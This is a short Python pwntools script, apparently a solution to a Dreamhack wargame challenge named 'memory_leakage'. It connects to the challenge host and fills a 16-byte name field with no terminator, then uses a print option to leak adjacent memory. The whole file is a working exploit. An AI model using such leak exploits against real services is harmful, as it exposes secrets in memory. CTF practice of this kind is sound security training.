from pwn import *

PORT =  20476
HOST = "host3.dreamhack.games"
exe = context.binary = ELF('./memory_leakage', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x0804876b
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# GDB()

def join(name, age):
	p.sendlineafter(b"> ", str(1).encode())
	p.sendafter(b"Name: ", name)
	p.sendlineafter(b"Age: ", str(age).encode())


p.sendlineafter(b"> ", str(3).encode())
join(b"A"*16, 2147483647)
p.sendlineafter(b"> ", str(2).encode())

p.interactive()